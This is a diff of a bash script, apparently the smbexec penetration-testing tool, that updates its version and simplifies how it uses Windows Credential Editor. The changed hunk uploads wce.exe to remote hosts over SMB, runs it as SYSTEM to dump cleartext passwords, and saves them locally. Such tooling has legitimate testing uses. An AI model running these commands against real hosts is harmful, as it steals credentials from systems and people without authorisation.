@@ -24,8 +24,8 @@
 #
 #############################################################################################
 
-version="1.2.8.3"
-codename="Take On Me"
+version="1.2.9"
+codename="Happy Accidents"
 # Check to see if X is running
 if [ -z $(pidof X) ] && [ -z $(pidof Xorg) ]; then
 	isxrunning=
@@ -70,7 +70,7 @@ if [ ! -e /usr/local/samba/lib/smb.conf ]; then
 fi
 
 # See if wce exists in the progs folder
-if [ -e "${smbexecpath}/wce-32.exe" ] && [ -e "${smbexecpath}/wce-64.exe" ]; then wce=1; fi
+if [ -e "${smbexecpath}/wce.exe" ]; then wce=1; fi
 
 f_ragequit(){ 
 echo -e "\n\n\e[1;31m[-]\e[0m Rage-quitting...."
@@ -580,14 +580,7 @@ for i in $(cat ${RHOSTS}); do
 		fi
 		#Get the clear text passwords with protected wce
 		if [ "${wce}" == 1 ]; then
-			${smbexecpath}/smbwinexe -A /tmp/smbexec/smbexec.auth //${i} "CMD /C echo %PROCESSOR_ARCHITECTURE%" &> /tmp/smbexec/sys_arch.txt
-			sys_arch=$(cat /tmp/smbexec/sys_arch.txt|grep x86)
-			if [ -z ${sys_arch} ]; then
-				wce_exe=wce-64.exe
-			else
-				wce_exe=wce-32.exe
-			fi
-			${smbexecpath}/smbexeclient -A /tmp/smbexec/smbexec.auth //${i}/${temp_drive}$ -c "put ${smbexecpath}/${wce_exe} ${temp_dir}\\wce.exe" &> /dev/null
+			${smbexecpath}/smbexeclient -A /tmp/smbexec/smbexec.auth //${i}/${temp_drive}$ -c "put ${smbexecpath}/wce.exe ${temp_dir}\\wce.exe" &> /dev/null
 			${smbexecpath}/smbwinexe --system -A /tmp/smbexec/smbexec.auth //${i} "CMD /C %TEMP%\wce.exe -w" &> /tmp/smbexec/wce.tmp
 			#Put the passwords in a text file in the logfolder
 			cat /tmp/smbexec/wce.tmp|grep :|egrep -v '(non-printable|ERROR|HASH)' > /tmp/smbexec/cleartext.pwds
@@ -1003,8 +996,8 @@ if [ "${run_as_system}" == "y" ]; then
 	get_system=--system
 fi
 }
-f_rbf(){
-xdg-open http://www.youtube.com/watch?v=QHpU0ZfXZ_g >& /tmp/smbexec/ddmdjunk
+f_jop(){
+xdg-open http://www.youtube.com/watch?v=YLO7tCdBVrA &> /tmp/smbexec/jopjunk
 f_mainmenu
 }
 
@@ -1236,7 +1229,7 @@ case "${mainchoice}" in
 	2) f_system_exploitation_menu;;
 	3) f_obtain_hashes_menu;;
 	4) f_freshstop;;
-	RBF) f_rbf;;
+	JOP) f_jop;;
 	*) f_mainmenu
 esac
 }
